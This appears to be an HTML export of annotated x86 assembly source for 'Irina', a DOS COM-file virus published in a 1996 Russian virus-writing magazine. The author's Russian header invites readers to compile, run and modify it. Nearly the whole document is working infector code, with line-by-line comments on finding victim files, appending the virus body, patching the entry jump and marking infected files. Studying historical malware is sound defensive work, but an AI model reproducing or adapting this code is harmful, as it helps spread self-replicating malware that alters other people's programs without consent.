<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment {</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; [Death Virii Crew] Presents</span><span class="sc0">
</span><span class="sc1">; CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 Irina.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Представляю всем читателям CHAOS A.D. свой первый вирь. Назван в честь моей</span><span class="sc0">
</span><span class="sc1">; любимой девушки. Он не содержит никаких деструктивных функций и заражает СОМ-</span><span class="sc0">
</span><span class="sc1">; файлы в текущем каталоге, дописывает себя в конец файла. Поскольку я человек</span><span class="sc0">
</span><span class="sc1">; скромный, то как признак заражеенности использована первая буква моей клички</span><span class="sc0">
</span><span class="sc1">; Q. Я считаю что вирь не сложный и может быть использован как учебное пособие</span><span class="sc0">
</span><span class="sc1">; для начинающих. У кого возникнут вопросы и предложения по даному изделию можете</span><span class="sc0">
</span><span class="sc1">; писать (ударение на второй слог) по адресу Death Virii Crew:263020,Луцк,а/я 11,</span><span class="sc0">
</span><span class="sc1">; Quiet (Irina). Для компиляции я использовал TASM ver.3.2 и ver.3.1. Откомпили-</span><span class="sc0">
</span><span class="sc1">; руйте, запустите и разрешите этому безобидному домашнему животному пожить в ва-</span><span class="sc0">
</span><span class="sc1">; шем информационном пространстве. Можете модифицировать этот вирь как хотите,</span><span class="sc0">
</span><span class="sc1">; но я не несу никакой ответственности за наннесенный ущерб причиненный какой-</span><span class="sc0">
</span><span class="sc1">; нибудь деструктивной функцией вставленной в вирь.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                           (C) By Quiet [DVC]</span><span class="sc0">
</span><span class="sc1">; {</span><span class="sc0">
</span><span class="sc1">;----------------------- резать тут -------------------------------------------</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                 </span><span class="sc1">; Машинный код команды JMP</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0004h</span><span class="sc0">                </span><span class="sc1">; На 4 байта</span><span class="sc0">
</span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DVCQ'</span><span class="sc0">         </span><span class="sc1">; Когда это вирь в чистом виде здесь записана абревиату-</span><span class="sc0">
                        </span><span class="sc1">; ра Death Virii Crew (DVC) и признак зараженности Q.</span><span class="sc0">
                        </span><span class="sc1">; Когда это зараженная прога здесь записано оригинальные</span><span class="sc0">
                        </span><span class="sc1">; первые три байта зараженной проги и признак заражен-</span><span class="sc0">
                        </span><span class="sc1">; ности Q.</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_1</span><span class="sc0">                 </span><span class="sc1">; При команде CALL процессор помещает адрес возврата</span><span class="sc0">
</span><span class="sc5">_1</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; (содержимое регистра IP) в стек выполняемой проги</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; вынимаем из стека то что заслали  CALL'ом в ВР</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10ah</span><span class="sc0">             </span><span class="sc1">; ВР=ВР-PSP(100h)+0ah где 0аh длинна от начала виря до</span><span class="sc0">
                        </span><span class="sc1">; даной команды и получаем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; сбрасываем флаг направления DF тем самым устанавливая</span><span class="sc0">
                        </span><span class="sc1">; направление выполнения операций со строками слева на</span><span class="sc0">
                        </span><span class="sc1">; направо</span><span class="sc0">

</span><span class="sc1">; в этой операции мы сравнивам первые три байта ячеек bytes и dvc для того чтобы</span><span class="sc0">
</span><span class="sc1">; определить: это чистый вирь или зараженная прога с вирием</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0">     </span><span class="sc1">; в SI смещение ячейки bytes</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; додаем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dvc</span><span class="sc0">       </span><span class="sc1">; в DI смещение ячейки dvc</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; додаем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; в CX количество проверяемых байт</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">       </span><span class="sc1">; операция проверки</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_2</span><span class="sc0">           </span><span class="sc1">; если байты совпадают, значит значит чистый вирь пере-</span><span class="sc0">
            </span><span class="sc1">; ход на _2, если не совпадают идем дальше</span><span class="sc0">

</span><span class="sc1">; здесь мы востанавливаем первые 3 байта зараженной проги</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0">     </span><span class="sc1">; в SI смещение ячейки bytes</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; додаем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; в DI адрес куда мы будем востанавливать</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; количество востанавливаемых байтов</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; операция пересылки</span><span class="sc0">

</span><span class="sc1">; в этой операции мы сохраняем DTA</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; количество пересылаемых байтов</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; эту сотню мы в стэк, потом мы используем ее для пере-</span><span class="sc0">
            </span><span class="sc1">; дачи управления зараженной проги</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; в SI адрес с какого начинается DTA (по умолчанию 80h)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">      </span><span class="sc1">; в DI адрес буфера в котрый мы сохраняем DTA</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; операция пересылки</span><span class="sc0">

</span><span class="sc5">_2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; здесь мы устанавливаем нужный на адрес DTA. Хотя по умолчанию он должен и так</span><span class="sc0">
</span><span class="sc1">; быть установлен по адресу 80h, но у меня с этим возникли проблеммы и я решил</span><span class="sc0">
</span><span class="sc1">; сам указать системе куда она должна возвращать имя потэнциальной жертвы.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; устанавливаем DTA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; по адресу 80h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; функция поиска первой жертвы</span><span class="sc0">
</span><span class="sc5">find</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; с атрибутом ARCHIVE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc0"> </span><span class="sc1">; смещение ячейки памяти в котрой нахаодится маска по</span><span class="sc0">
            </span><span class="sc1">; которой мы будем искать жертву</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">_3</span><span class="sc0">          </span><span class="sc1">; если нет ошибок то на _3</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">        </span><span class="sc1">; ошибки? на выход</span><span class="sc0">

</span><span class="sc5">_3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">9ah</span><span class="sc4">],</span><span class="sc2">61000</span><span class="sc0"> </span><span class="sc1">; потенцильная жертва не должна быть больше 61000 </span><span class="sc0">
                </span><span class="sc1">; байтов. Длинна потенциальной жертвы возвражается</span><span class="sc0">
                </span><span class="sc1">; системой по смещению 9аh </span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; если длинна больше 61000 то на поиск следующей жертвы</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">; открываем жертву на чтение/запись</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">  </span><span class="sc1">; в DX адрес ячейки памяти в которой находится имя жертвы (по </span><span class="sc0">
        </span><span class="sc1">; умолчанию оно находится по адресу 9eh)</span><span class="sc0">

</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на поиск следующей жертвы</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Описатель файла в BX.При открытии файла система на-</span><span class="sc0">
            </span><span class="sc1">; значает ему определенный описатель через который она </span><span class="sc0">
            </span><span class="sc1">; будет работать с файлом в дальнейшем </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; функция чтеня из файла в AH</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; количество считываемых байтов в CX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc1">; смещение ячейки памяти в которую будем считывать в DX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну зараженной проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на поиск следующей жертвы</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; в AX функция перемещения pointer'a в конец жертвы</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в CX 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в DX 0</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на поиск следующей жертвы</span><span class="sc0">

</span><span class="sc1">; при перемещении pointer'a в конец файла в AX возвращается длинна файла</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flen</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; содержимое AX в flen[bp]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; вычитаем 3 байта (длинна команды JMP которая будет </span><span class="sc0">
            </span><span class="sc1">; стоять в начале). В AX будет длинна на которую нужно </span><span class="sc0">
            </span><span class="sc1">; совершить JMP переход</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">jmpadr</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; содержимое AX в jmpadr[bp]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">flen</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; длинну жертвы в DX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">       </span><span class="sc1">; длинну виря в CX</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; вычитаем CX из DX </span><span class="sc0">
</span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; если результат отрицаиельный то поиск следующей жертвы</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">        </span><span class="sc1">; прибавим к DX 6 байтов</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; в AX функция перемещения pointer'a в начало файла</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; CX=0</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_4</span><span class="sc0">          </span><span class="sc1">; переход на _4</span><span class="sc0">

</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; здесь мы ищем следующую жертву</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; закрываем файл</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; поиск следующей жертвы</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0">

</span><span class="sc5">_4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; читаем из файла</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; 1 байт</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; в ячейку bytes на место последнего символа</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc1">; здесь мы проверям файл на зараженнность</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc12">'Q'</span><span class="sc0"> </span><span class="sc1">; сравниваем то что прочитали с буквой Q</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; эту жертву мы уже имели? на поиск следующей жертвы</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; в AX функция премещения pointer'a в конец файла</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в DX 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в CX 0</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc1">; здеся мы имеем жертву</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; в AH функция записи в файл</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">       </span><span class="sc1">; в CX количество записываемых байтов</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; в DX откуда будем записывать </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на nеxt</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; в AX функция перемещения pointer'a в начало файла</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в CX 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в DX 0</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; записываем в жертву</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; один байт</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">  </span><span class="sc1">; с ячейки памяти JUMP</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; записываем в жертву</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; два байта</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmpadr</span><span class="sc0">    </span><span class="sc1">; с ячейки памяти JMPADR</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">flen</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; в AX из FLEN[BP]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">        </span><span class="sc1">; прибавляем 6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flen</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; и засылаем все это в AX</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; pointer в начало</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; в CX 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">flen</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; в DX из FLEN[BP]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">         </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; записываем в жертву</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; 1 байт</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q</span><span class="sc0">     </span><span class="sc1">; и ячейки памяти Q</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; прибавляем длинну проги</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">        </span><span class="sc1">; если нет ошибок то на выход</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">        </span><span class="sc1">; ошибки? на next</span><span class="sc0">

</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; выход</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; закрываем жертву</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">      </span><span class="sc1">; в SI адрес где находится старая DTA </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; в DI адрес куда мы ее перешлем</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; в CX сколько мы ее перешлем</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; пресылаем</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; GAME OVER</span><span class="sc0">

